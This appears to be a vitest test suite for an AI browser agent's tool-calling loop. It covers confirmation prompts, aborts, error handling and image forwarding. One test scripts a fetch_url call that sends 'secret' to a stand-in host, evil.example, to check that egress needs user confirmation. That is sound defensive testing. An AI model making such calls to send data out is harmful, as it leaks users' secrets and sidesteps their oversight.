import { describe, expect, it } from 'vitest';
import { confirmationFor, IMAGES_NOT_SHOWN, runAgent, TOOL_RESULT_TEXT } from '../../src/agent/loop';
import type {
  AgentEvent,
  ChatMessage,
  ConfirmDecision,
  ConfirmRequest,
  RunAgentOptions,
  ToolMessage,
  ToolSource,
} from '../../src/shared/types';
import { CcError } from '../../src/shared/types';
import {
  TAB,
  counterIds,
  fakeSource,
  hangingStream,
  scriptedLlm,
  text,
  toolCalls,
  untilAbort,
  type ScriptedLlm,
  type Step,
} from './fakes';

const SYSTEM: ChatMessage = { role: 'system', content: 'sys' };
const USER: ChatMessage = { role: 'user', content: 'do it' };

function setup(
  steps: Step[],
  sources: ToolSource[],
  over: Partial<RunAgentOptions> = {},
): { llm: ScriptedLlm; events: AgentEvent[]; confirms: ConfirmRequest[]; controller: AbortController; run: () => ReturnType<typeof runAgent> } {
  const llm = scriptedLlm(steps);
  const events: AgentEvent[] = [];
  const confirms: ConfirmRequest[] = [];
  const controller = new AbortController();
  const options: RunAgentOptions = {
    llm,
    model: 'm',
    sources,
    messages: [SYSTEM, USER],
    tab: TAB,
    signal: controller.signal,
    maxSteps: 10,
    confirmMutations: true,
    confirm: (r) => {
      confirms.push(r);
      return Promise.resolve({ allow: true });
    },
    emit: (e) => events.push(structuredClone(e)),
    newId: counterIds(),
    ...over,
  };
  return { llm, events, confirms, controller, run: () => runAgent(options) };
}

/** Every assistant tool call is followed by exactly one matching tool message. */
function expectNoDanglingCalls(messages: ChatMessage[]): void {
  messages.forEach((m, i) => {
    if (m.role !== 'assistant' || !m.tool_calls) return;
    const following = messages.slice(i + 1, i + 1 + m.tool_calls.length) as ToolMessage[];
    expect(following.map((t) => [t.role, t.tool_call_id])).toEqual(m.tool_calls.map((c) => ['tool', c.id]));
  });
}

const echo = fakeSource([{ name: 'echo' }], { echo: (args) => ({ ok: true, content: `echo:${JSON.stringify(args)}` }) });

describe('runAgent', () => {
  it('answers with text only (single step) and streams deltas', async () => {
    const { run, events, llm } = setup([[{ type: 'text-delta', text: 'Hel' }, ...text('lo')]], [echo]);
    const result = await run();
    expect(result.reason).toBe('complete');
    expect(result.messages).toEqual([{ role: 'assistant', content: 'Hello' }]);
    expect(events.filter((e) => e.type === 'assistant.delta')).toEqual([
      { type: 'assistant.delta', itemId: 'id1', text: 'Hel' },
      { type: 'assistant.delta', itemId: 'id1', text: 'lo' },
    ]);
    expect(llm.requests[0]!.tools!.map((t) => t.name)).toEqual(['echo']);
    expect(llm.requests[0]!.messages).toEqual([SYSTEM, USER]);
    expect(llm.requests[0]).not.toHaveProperty('temperature');
  });

  it('runs tools over several steps, feeds results back and accumulates usage', async () => {
    const { run, llm, events } = setup(
      [toolCalls(['c1', 'echo', { a: 1 }]), toolCalls(['c2', 'echo', { b: 2 }]), text('done')],
      [echo],
      { temperature: 0.1 },
    );
    const result = await run();
    expect(result.reason).toBe('complete');
    expect(result.messages).toEqual([
      { role: 'assistant', content: null, tool_calls: [{ id: 'c1', type: 'function', function: { name: 'echo', arguments: '{"a":1}' } }] },
      { role: 'tool', tool_call_id: 'c1', content: 'echo:{"a":1}' },
      { role: 'assistant', content: null, tool_calls: [{ id: 'c2', type: 'function', function: { name: 'echo', arguments: '{"b":2}' } }] },
      { role: 'tool', tool_call_id: 'c2', content: 'echo:{"b":2}' },
      { role: 'assistant', content: 'done' },
    ]);
    expect(llm.requests).toHaveLength(3);
    expect(llm.requests[2]!.messages).toEqual([SYSTEM, USER, ...result.messages.slice(0, 4)]);
    expect(llm.requests[0]!.temperature).toBe(0.1);
    expect(result.usage).toEqual({ promptTokens: 50, completionTokens: 9, totalTokens: 59 });
    expect(events.filter((e) => e.type === 'message')).toHaveLength(5);
    const toolEvents = events.filter((e) => e.type.startsWith('tool.'));
    expect(toolEvents[0]).toMatchObject({ type: 'tool.start', item: { id: 'c1', name: 'echo', args: { a: 1 }, status: 'running', sourceLabel: 'Built-in' } });
    expect(toolEvents[1]).toMatchObject({ type: 'tool.end', itemId: 'c1', status: 'ok', result: { ok: true } });
  });

  it('executes parallel calls sequentially in order', async () => {
    const order: string[] = [];
    const slow = fakeSource([{ name: 'slow' }, { name: 'fast' }], {
      slow: async () => {
        order.push('slow:start');
        await new Promise((r) => setTimeout(r, 10));
        order.push('slow:end');
        return { ok: true, content: 's' };
      },
      fast: () => {
        order.push('fast');
        return { ok: true, content: 'f' };
      },
    });
    const { run } = setup([toolCalls(['a', 'slow', {}], ['b', 'fast', {}]), text('ok')], [slow]);
    const result = await run();
    expect(order).toEqual(['slow:start', 'slow:end', 'fast']);
    expectNoDanglingCalls(result.messages);
  });

  it('routes calls to the source that owns the tool', async () => {
    const a = fakeSource([{ name: 'one' }], { one: () => ({ ok: true, content: 'from a' }) }, 'builtin', 'Built-in');
    const b = fakeSource([{ name: 'mcp__srv__two' }], { mcp__srv__two: () => ({ ok: true, content: 'from b' }) }, 'mcp', 'MCP');
    const { run, events } = setup([toolCalls(['x', 'mcp__srv__two', {}], ['y', 'one', {}]), text('ok')], [a, b]);
    const result = await run();
    expect(b.calls).toEqual([{ name: 'mcp__srv__two', args: {} }]);
    expect(a.calls).toEqual([{ name: 'one', args: {} }]);
    expect(result.messages.filter((m) => m.role === 'tool').map((m) => m.content)).toEqual(['from b', 'from a']);
    expect(events.find((e) => e.type === 'tool.start')).toMatchObject({ item: { sourceLabel: 'MCP' } });
  });

  it('feeds an error back for an unknown tool and continues', async () => {
    const { run, events } = setup([toolCalls(['u', 'nope', {}]), text('sorry')], [echo]);
    const result = await run();
    expect(result.reason).toBe('complete');
    const tool = result.messages[1] as ToolMessage;
    expect(tool.content).toContain('Unknown tool "nope"');
    expect(tool.content).toContain('echo');
    expect(events.find((e) => e.type === 'tool.end')).toMatchObject({ status: 'error', result: { ok: false } });
  });

  it('turns a throwing tool into ok:false and continues', async () => {
    const boom = fakeSource([{ name: 'boom' }], {
      boom: () => {
        throw new Error('kaput');
      },
    });
    const { run } = setup([toolCalls(['b', 'boom', {}]), text('handled')], [boom]);
    const result = await run();
    expect((result.messages[1] as ToolMessage).content).toBe('Tool "boom" failed: kaput');
    expect(result.messages.at(-1)).toEqual({ role: 'assistant', content: 'handled' });
  });

  it('reports invalid argument JSON to the model and records valid JSON in the transcript', async () => {
    const { run } = setup([toolCalls(['i', 'echo', '{"a": ']), text('retry later')], [echo]);
    const result = await run();
    const assistant = result.messages[0]!;
    expect(assistant.role === 'assistant' && assistant.tool_calls![0]!.function.arguments).toBe('{}');
    expect((result.messages[1] as ToolMessage).content).toContain('Invalid arguments for "echo"');
    expect(echo.calls.some((c) => c.args === undefined)).toBe(false);
  });

  it('gives duplicate / missing call ids unique ids', async () => {
    const { run } = setup([toolCalls(['dup', 'echo', {}], ['dup', 'echo', {}], ['', 'echo', {}]), text('ok')], [echo]);
    const result = await run();
    const ids = (result.messages[0] as Extract<ChatMessage, { role: 'assistant' }>).tool_calls!.map((c) => c.id);
    expect(new Set(ids).size).toBe(3);
    expect(ids[0]).toBe('dup');
    expectNoDanglingCalls(result.messages);
  });

  it('forwards tool images as a user message with image parts after all tool results', async () => {
    const shot = fakeSource([{ name: 'shot' }], {
      shot: () => ({ ok: true, content: 'captured', images: [{ mime: 'image/png', base64: 'AAAA' }] }),
    });
    const { run, llm } = setup([toolCalls(['s', 'shot', {}], ['e', 'echo', {}]), text('I see')], [shot, echo]);
    const result = await run();
    expect(result.messages.map((m) => m.role)).toEqual(['assistant', 'tool', 'tool', 'user', 'assistant']);
    const follow = result.messages[3]!;
    expect(follow.content).toEqual([
      { type: 'text', text: 'Image returned by tool "shot" (call s):' },
      { type: 'image_url', image_url: { url: 'data:image/png;base64,AAAA' } },
    ]);
    expect(llm.requests[1]!.messages.at(-1)).toEqual(follow);
  });

  describe('confirmation', () => {
    const mut = (): ReturnType<typeof fakeSource> =>
      fakeSource([{ name: 'click', mutates: true }], { click: () => ({ ok: true, content: 'clicked' }) });

    it('asks for mutating tools, then runs them when allowed', async () => {
      const src = mut();
      const { run, confirms, events } = setup([toolCalls(['k', 'click', { s: '#a' }]), text('ok')], [src]);
      await run();
      expect(confirms).toEqual([{ id: 'id1', toolCallId: 'k', toolName: 'click', args: { s: '#a' }, sourceLabel: 'Built-in', reason: 'mutates' }]);
      const statuses = events.flatMap((e) =>
        e.type === 'tool.start' ? [e.item.status] : e.type === 'tool.update' || e.type === 'tool.end' ? [e.status] : [],
      );
      expect(statuses).toEqual(['pending-confirm', 'running', 'ok']);
      expect(src.calls).toHaveLength(1);
    });

    it('tells the model when the user declines', async () => {
      const src = mut();
      const { run, events } = setup([toolCalls(['k', 'click', {}]), text('ok')], [src], {
        confirm: () => Promise.resolve({ allow: false }),
      });
      const result = await run();
      expect(src.calls).toHaveLength(0);
      expect((result.messages[1] as ToolMessage).content).toBe(TOOL_RESULT_TEXT.denied);
      expect(events.find((e) => e.type === 'tool.end')).toMatchObject({ status: 'denied' });
    });

    it('leaves "always" to the confirm callback (the session keys it by tab origin)', async () => {
      const src = mut();
      const asked: string[] = [];
      const { run } = setup([toolCalls(['k1', 'click', {}]), toolCalls(['k2', 'click', {}]), text('ok')], [src], {
        confirm: (r): Promise<ConfirmDecision> => {
          asked.push(r.toolCallId);
          return Promise.resolve({ allow: true, always: true });
        },
      });
      await run();
      expect(asked).toEqual(['k1', 'k2']);
      expect(src.calls).toHaveLength(2);
    });

    it('does not ask when confirmations are off or the tool does not mutate', async () => {
      const src = mut();
      const { run, confirms } = setup([toolCalls(['k', 'click', {}], ['e', 'echo', {}]), text('ok')], [src, echo], {
        confirmMutations: false,
      });
      await run();
      expect(confirms).toEqual([]);
      const second = setup([toolCalls(['e', 'echo', {}]), text('ok')], [echo]);
      await second.run();
      expect(second.confirms).toEqual([]);
    });
  });

  describe('abort', () => {
    it('before start', async () => {
      const { run, controller, llm } = setup([text('x')], [echo]);
      controller.abort();
      const result = await run();
      expect(result).toMatchObject({ reason: 'aborted', messages: [] });
      expect(llm.requests).toHaveLength(0);
    });

    it('during the stream keeps the partial text', async () => {
      const { run, controller, events } = setup([hangingStream('part')], [echo]);
      const promise = run();
      await new Promise((r) => setTimeout(r, 5));
      expect(events.some((e) => e.type === 'assistant.delta')).toBe(true);
      controller.abort();
      const result = await promise;
      expect(result.reason).toBe('aborted');
      expect(result.messages).toEqual([{ role: 'assistant', content: 'part' }]);
    });

    it('during a tool: the running call is aborted, later calls are not run, no call dangles', async () => {
      let started!: () => void;
      const startedP = new Promise<void>((r) => (started = r));
      const src = fakeSource([{ name: 'wait' }, { name: 'after' }], {
        wait: (_args, ctx) => {
          started();
          return untilAbort(ctx.signal);
        },
        after: () => ({ ok: true, content: 'should not run' }),
      });
      const { run, controller, events } = setup([toolCalls(['w', 'wait', {}], ['a', 'after', {}])], [src]);
      const promise = run();
      await startedP;
      controller.abort();
      const result = await promise;
      expect(result.reason).toBe('aborted');
      expectNoDanglingCalls(result.messages);
      expect(result.messages.map((m) => (m.role === 'tool' ? m.content : m.role))).toEqual([
        'assistant',
        TOOL_RESULT_TEXT.aborted,
        TOOL_RESULT_TEXT.notRun,
      ]);
      expect(src.calls.map((c) => c.name)).toEqual(['wait']);
      expect(events.filter((e) => e.type === 'tool.end').map((e) => e.type === 'tool.end' && e.status)).toEqual(['aborted', 'aborted']);
    });

    it('during a tool that ignores the signal', async () => {
      const src = fakeSource([{ name: 'stuck' }], { stuck: () => new Promise(() => undefined) });
      const { run, controller } = setup([toolCalls(['s', 'stuck', {}])], [src]);
      const promise = run();
      await new Promise((r) => setTimeout(r, 5));
      controller.abort();
      const result = await promise;
      expect(result.reason).toBe('aborted');
      expectNoDanglingCalls(result.messages);
    });

    it('during a confirmation that never answers', async () => {
      const src = fakeSource([{ name: 'click', mutates: true }], { click: () => ({ ok: true, content: 'x' }) });
      const { run, controller, events } = setup([toolCalls(['k', 'click', {}])], [src], { confirm: () => new Promise(() => undefined) });
      const promise = run();
      await new Promise((r) => setTimeout(r, 5));
      controller.abort();
      const result = await promise;
      expect(result.reason).toBe('aborted');
      expect(src.calls).toHaveLength(0);
      expectNoDanglingCalls(result.messages);
      expect(events.find((e) => e.type === 'tool.end')).toMatchObject({ status: 'aborted' });
    });
  });

  it('stops at maxSteps with a consistent transcript', async () => {
    const { run, llm } = setup([toolCalls(['1', 'echo', {}]), toolCalls(['2', 'echo', {}]), text('never')], [echo], { maxSteps: 2 });
    const result = await run();
    expect(result.reason).toBe('max-steps');
    expect(llm.requests).toHaveLength(2);
    expectNoDanglingCalls(result.messages);
  });

  it('repairs dangling tool calls in the incoming history', async () => {
    const history: ChatMessage[] = [
      SYSTEM,
      { role: 'user', content: 'first' },
      { role: 'assistant', content: null, tool_calls: [{ id: 'old', type: 'function', function: { name: 'echo', arguments: '{}' } }] },
      { role: 'user', content: 'second' },
    ];
    const { run, llm } = setup([text('ok')], [echo], { messages: history });
    await run();
    const sent = llm.requests[0]!.messages;
    expect(sent.map((m) => m.role)).toEqual(['system', 'user', 'assistant', 'tool', 'user']);
    expectNoDanglingCalls(sent);
    expect(history).toHaveLength(4); // input not mutated
  });

  it('rethrows LLM errors after recording partial text', async () => {
    const failing: Step = () =>
      (async function* () {
        yield { type: 'text-delta' as const, text: 'half' };
        throw new CcError('http', 'upstream 502', { status: 502 });
      })();
    const { run, events } = setup([failing], [echo]);
    await expect(run()).rejects.toMatchObject({ code: 'http', status: 502 });
    expect(events.filter((e) => e.type === 'message')).toEqual([{ type: 'message', message: { role: 'assistant', content: 'half' } }]);
  });

  it('skips a tool source whose listing fails and sends no tools when none are left', async () => {
    const broken: ToolSource = {
      id: 'mcp',
      label: 'MCP',
      listTools: () => Promise.reject(new Error('offline')),
      callTool: () => Promise.reject(new Error('unreachable')),
    };
    const { run, llm } = setup([text('hi')], [broken]);
    await run();
    expect(llm.requests[0]).not.toHaveProperty('tools');
  });

  it('survives an emit handler that throws', async () => {
    const { run } = setup([text('ok')], [echo], {
      emit: () => {
        throw new Error('ui gone');
      },
    });
    await expect(run()).resolves.toMatchObject({ reason: 'complete' });
  });
});

describe('tab refresh between steps', () => {
  it('re-lists URL-matched tools and rebuilds the system prompt after a navigation', async () => {
    let url = TAB.url;
    const listed: string[] = [];
    const source: ToolSource = {
      id: 'builtin',
      label: 'Built-in',
      listTools: (tab) => {
        listed.push(tab.url);
        return Promise.resolve([
          { name: 'navigate', description: 'nav', parameters: { type: 'object', properties: {} } },
          ...(tab.url.includes('news')
            ? [{ name: 'news_tool', description: 'news', parameters: { type: 'object' as const, properties: {} } }]
            : []),
        ]);
      },
      callTool: (name) => {
        if (name === 'navigate') url = 'https://news.example/front';
        return Promise.resolve({ ok: true, content: `ran ${name}` });
      },
    };
    const getTabCalls: number[] = [];
    const { llm, run } = setup([toolCalls(['c1', 'navigate', {}]), toolCalls(['c2', 'news_tool', {}]), text('ok')], [source], {
      getTab: () => {
        getTabCalls.push(1);
        return Promise.resolve({ ...TAB, url, title: url.includes('news') ? 'News' : TAB.title });
      },
      systemPrompt: (tab) => `sys for ${tab.url}`,
    });
    const result = await run();
    expect(result.reason).toBe('complete');
    expect(getTabCalls).toHaveLength(2); // before steps 2 and 3, not before the first
    expect(listed).toEqual([TAB.url, 'https://news.example/front']);
    expect(llm.requests[0]!.messages[0]).toEqual(SYSTEM);
    expect(llm.requests[1]!.messages[0]).toEqual({ role: 'system', content: 'sys for https://news.example/front' });
    expect(llm.requests[1]!.tools?.map((t) => t.name)).toEqual(['navigate', 'news_tool']);
    const toolMsg = result.messages.find((m): m is ToolMessage => m.role === 'tool' && m.tool_call_id === 'c2');
    expect(toolMsg?.content).toBe('ran news_tool');
  });

  it('keeps the previous tab when getTab fails, and uses the per-tool source label', async () => {
    const src = fakeSource([{ name: 'mcp__s__x', mutates: true, sourceLabel: 'MCP: s' }], { mcp__s__x: () => ({ ok: true, content: 'x' }) }, 'mcp', 'MCP');
    const { confirms, events, run } = setup([toolCalls(['c1', 'mcp__s__x', {}]), text('ok')], [src], {
      getTab: () => Promise.reject(new CcError('no-tab', 'gone')),
      systemPrompt: () => 'never',
    });
    expect((await run()).reason).toBe('complete');
    expect(confirms[0]?.sourceLabel).toBe('MCP: s');
    const start = events.find((e) => e.type === 'tool.start');
    expect(start?.type === 'tool.start' && start.item.sourceLabel).toBe('MCP: s');
  });

  describe('review fixes', () => {
    it('asks before egress tools, naming the destination host (fetch_url)', async () => {
      const fetchUrl = fakeSource([{ name: 'fetch_url', egress: true }], { fetch_url: () => ({ ok: true, content: 'page' }) });
      const { run, confirms } = setup([toolCalls(['f', 'fetch_url', { url: 'https://evil.example/?q=secret' }]), text('ok')], [fetchUrl]);
      await run();
      expect(confirms[0]).toMatchObject({ toolName: 'fetch_url', reason: 'egress', egressHost: 'evil.example' });
    });

    it('asks only when a confirmWhenArgs argument is set (list_tabs all_windows)', async () => {
      const tabs = fakeSource([{ name: 'list_tabs', confirmWhenArgs: ['all_windows'] }], { list_tabs: () => ({ ok: true, content: 'tabs' }) });
      const first = setup([toolCalls(['a', 'list_tabs', {}]), text('ok')], [tabs]);
      await first.run();
      expect(first.confirms).toEqual([]);
      const second = setup([toolCalls(['b', 'list_tabs', { all_windows: true }]), text('ok')], [tabs]);
      await second.run();
      expect(second.confirms[0]).toMatchObject({ reason: 'args', triggerArgs: ['all_windows'] });
    });

    it('confirmationFor: mutates wins, unparsable egress URL still asks', () => {
      expect(confirmationFor({ name: 'x', description: '', parameters: { type: 'object' }, mutates: true, egress: true }, {})).toEqual({ reason: 'mutates' });
      expect(confirmationFor({ name: 'x', description: '', parameters: { type: 'object' }, egress: true }, { url: 'not a url' })).toEqual({ reason: 'egress' });
      expect(confirmationFor({ name: 'x', description: '', parameters: { type: 'object' } }, { url: 'https://a.example' })).toBeNull();
    });

    it('emits thinking once per step and sends reasoning_details back on the tool-call turn', async () => {
      const details = [{ type: 'reasoning.encrypted', data: 'abc', index: 0 }];
      const steps: Step[] = [
        [
          { type: 'reasoning' },
          { type: 'reasoning' },
          { type: 'tool-call', call: { id: 'e1', type: 'function', function: { name: 'echo', arguments: '{}' } } },
          { type: 'done', finishReason: 'tool_calls', reasoningDetails: details },
        ],
        text('done'),
      ];
      const { run, events, llm } = setup(steps, [echo]);
      const result = await run();
      expect(events.filter((e) => e.type === 'thinking')).toHaveLength(1);
      expect(result.messages[0]).toMatchObject({ role: 'assistant', reasoning_details: details });
      expect(llm.requests[1]!.messages.find((m) => m.role === 'assistant')).toMatchObject({ reasoning_details: details });
    });

    it('replaces images with describeImages text when given (chat model cannot see)', async () => {
      const shot = fakeSource([{ name: 'shot' }], {
        shot: () => ({ ok: true, content: 'captured', images: [{ mime: 'image/png', base64: 'AAAA' }] }),
      });
      const asked: string[] = [];
      const { run, llm } = setup([toolCalls(['s', 'shot', {}]), text('ok')], [shot], {
        describeImages: (images, ctx) => {
          asked.push(`${ctx.toolName}:${images.length}`);
          return Promise.resolve('A login form.');
        },
      });
      const result = await run();
      expect(asked).toEqual(['shot:1']);
      const follow = result.messages[2]!;
      expect(typeof follow.content).toBe('string');
      expect(follow.content).toContain('A login form.');
      expect(JSON.stringify(llm.requests[1]!.messages)).not.toContain('image_url');
    });

    it('a failing describeImages becomes a note, not a run failure', async () => {
      const shot = fakeSource([{ name: 'shot' }], {
        shot: () => ({ ok: true, content: 'captured', images: [{ mime: 'image/png', base64: 'AAAA' }] }),
      });
      const { run } = setup([toolCalls(['s', 'shot', {}]), text('ok')], [shot], {
        describeImages: () => Promise.reject(new Error('boom')),
      });
      const result = await run();
      expect(result.reason).toBe('complete');
      expect(result.messages[2]!.content).toContain(IMAGES_NOT_SHOWN);
    });
  });
});
